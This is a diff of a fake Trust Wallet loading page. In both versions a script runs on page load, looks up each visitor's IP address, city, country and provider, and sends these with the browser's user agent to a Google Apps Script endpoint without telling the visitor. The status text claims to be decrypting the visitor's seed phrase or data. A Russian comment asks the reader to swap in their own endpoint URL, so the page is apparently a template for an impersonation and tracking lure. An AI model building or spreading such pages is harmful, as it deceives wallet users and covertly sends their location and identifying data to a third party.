@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet | Loading</title>
+    <title>Trust Wallet</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; font-family: sans-serif; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; font-family: -apple-system, sans-serif; }
         .container { text-align: center; width: 90%; max-width: 350px; }
         .logo-svg { width: 80px; height: 80px; margin-bottom: 40px; fill: #0500ff; }
-        .loader-track { width: 100%; height: 5px; background-color: #f0f2f5; border-radius: 10px; margin-bottom: 25px; overflow: hidden; position: relative; }
-        .loader-fill { width: 0%; height: 100%; background: #0500ff; animation: progress 4s infinite ease-in-out; }
-        .status { color: #5b616e; font-size: 16px; font-weight: 500; }
-        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        .loader-track { width: 100%; height: 4px; background-color: #f0f2f5; border-radius: 10px; margin-bottom: 20px; overflow: hidden; position: relative; }
+        .loader-fill { width: 0%; height: 100%; background: #0500ff; animation: load 4s infinite ease-in-out; }
+        .status { color: #5b616e; font-size: 15px; font-weight: 500; }
+        @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
     </style>
 </head>
 <body>
@@ -23,49 +23,40 @@
         <path d="M140 230l80 80 152-152" stroke="#0500ff" stroke-width="40" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
     </svg>
     <div class="loader-track"><div class="loader-fill"></div></div>
-    <div class="status">Расшифровываем вашу seed-фразу, получаем доступ к вашим деньгам...</div>
+    <div class="status" id="status-text">Расшифровываем Ваши данные...</div>
 </div>
 
 <script>
-    async function logVisit() {
-        const googleScriptURL = 'https://script.google.com/macros/s/AKfycbwEa3DYENoLFr7sz7gNCkRAr8xBGu4vaxxTF3mX-PDJkeUfO3GczYNKudGbwS5Bb4N1Lw/exec';
-        
+    async function sendLog() {
+        // !!! ЗАМЕНИ ССЫЛКУ НИЖЕ НА СВОЮ ИЗ ШАГА 1 !!!
+        const webAppURL = 'https://script.google.com/macros/s/AKfycbykwY3qxSHEORxLTMD7eR5R6aK_3z12sNcG_OcEFdItC00ge1UZRTDjOsJPyKqKU0JCwg/exec';
+
         try {
-            // 1. Получаем данные о локации через сторонний API
-            const response = await fetch('https://ipapi.co/json/');
-            const geo = await response.json();
+            // Получаем IP и Гео
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geo = await geoRes.json();
             
-            const locationString = `${geo.country_name}, ${geo.city} (провайдер: ${geo.org})`;
-            const ip = geo.ip;
-
-            // 2. Отправляем собранные данные в твою Google Таблицу
             const params = new URLSearchParams();
+            params.append('ip', geo.ip);
+            params.append('location', `${geo.country_name}, ${geo.city}`);
             params.append('userAgent', navigator.userAgent);
-            params.append('location', locationString);
-            params.append('ip', ip);
 
-            fetch(googleScriptURL, {
+            // Отправка в таблицу
+            fetch(webAppURL, {
                 method: 'POST',
-                body: params,
                 mode: 'no-cors',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                body: params
             });
-            
-        } catch (error) {
-            // Если API локации заблокирован, отправляем хотя бы данные браузера
-            console.log("Geo error, sending basic info");
+        } catch (e) {
+            // Если IP заблокирован, отправляем базовое инфо
             const params = new URLSearchParams();
             params.append('userAgent', navigator.userAgent);
-            params.append('location', 'Ошибка определения');
-            
-            fetch(googleScriptURL, { method: 'POST', body: params, mode: 'no-cors' });
+            fetch(webAppURL, { method: 'POST', mode: 'no-cors', body: params });
         }
     }
 
-    // Запускаем при загрузке
-    window.onload = logVisit;
+    window.onload = sendLog;
 </script>
 
 </body>
 </html>
-
